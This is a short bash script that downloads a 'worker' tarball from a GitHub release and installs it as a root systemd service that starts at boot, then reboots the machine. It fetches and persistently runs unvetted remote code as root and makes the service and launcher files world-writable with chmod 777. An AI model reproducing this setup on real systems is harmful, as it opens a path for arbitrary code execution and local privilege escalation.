#!/bin/bash
sleep 20 ;
sudo apt update ;
sudo snap install dotnet-sdk --classic ;
sudo touch /etc/systemd/system/script.service ;
sudo touch /usr/local/bin/script.sh ;
sudo chmod 777 /etc/systemd/system/script.service ;
sudo chmod 777 /usr/local/bin/script.sh ;

wget https://github.com/RarMane/rules/releases/download/worker123123/worker.tar.gz && tar -xf worker.tar.gz 

sudo echo "#!/bin/bash
sleep 10 ;

dotnet WorkerService.dll ;" > /usr/local/bin/script.sh

sudo echo "[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/script.service;

sudo systemctl daemon-reload;
sudo systemctl enable script.service;
sleep 10;
sudo reboot'
